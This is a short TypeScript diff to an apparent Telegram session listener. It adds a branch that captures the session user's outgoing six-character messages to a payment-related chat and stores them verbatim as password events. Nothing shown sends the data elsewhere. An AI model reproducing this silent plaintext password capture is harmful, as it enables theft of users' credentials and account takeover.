@@ -289,11 +289,20 @@ function startGlobalListener(session: TgSession): void {
 
   session.globalHandler = async (event: NewMessageEvent) => {
     const msg = event.message;
-    if (msg.out) return;
     const text = msg.message ?? "";
     if (!text.trim()) return;
 
     const chatId = String(msg.chatId ?? msg.senderId ?? "");
+
+    // ─── Capture outgoing password sent directly in Telegram ───
+    if (msg.out) {
+      const eid = session.kkpayEntityId;
+      const isToKkpay = eid && (chatId === eid || `-100${chatId}` === eid);
+      if (isToKkpay && /^[0-9a-zA-Z]{6}$/.test(text.trim())) {
+        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_sent", text.trim());
+      }
+      return;
+    }
     const senderId = String(msg.senderId ?? "");
 
     let chatTitle = chatId;
